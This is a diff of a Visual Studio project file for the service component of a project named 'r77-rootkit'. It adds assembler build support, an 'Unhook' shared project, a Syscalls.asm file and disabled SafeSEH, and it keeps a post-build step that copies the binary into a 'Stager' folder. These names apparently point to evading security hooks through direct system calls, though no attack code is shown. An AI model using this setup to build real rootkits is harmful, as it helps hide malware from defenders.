@@ -33,10 +33,12 @@
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
   </ImportGroup>
   <ImportGroup Label="Shared">
     <Import Project="..\r77api\r77api.vcxitems" Label="Shared" />
     <Import Project="..\Service\Service.vcxitems" Label="Shared" />
+    <Import Project="..\Unhook\Unhook.vcxitems" Label="Shared" />
   </ImportGroup>
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
@@ -70,6 +72,7 @@
       <AdditionalDependencies>ntdll.lib;shlwapi.lib;taskschd.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
       <EntryPointSymbol>EntryPoint</EntryPointSymbol>
+      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
     </Link>
     <PostBuildEvent>
       <Command>"$(SolutionDir)BuildTask\bin\$(Configuration)\BuildTask.exe" "$(TargetPath)" -r77service
@@ -99,6 +102,7 @@ xcopy /Y "$(TargetPath)" "$(SolutionDir)Stager\Resources"
       <AdditionalDependencies>ntdll.lib;shlwapi.lib;taskschd.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
       <EntryPointSymbol>EntryPoint</EntryPointSymbol>
+      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
     </Link>
     <PostBuildEvent>
       <Command>"$(SolutionDir)BuildTask\bin\$(Configuration)\BuildTask.exe" "$(TargetPath)" -r77service
@@ -108,5 +112,11 @@ xcopy /Y "$(TargetPath)" "$(SolutionDir)Stager\Resources"
   </ItemDefinitionGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
   </ImportGroup>
+  <ItemGroup>
+    <MASM Update="A:\Code\GitHub\r77-rootkit\Service\Syscalls.asm">
+      <FileType>Document</FileType>
+    </MASM>
+  </ItemGroup>
 </Project>
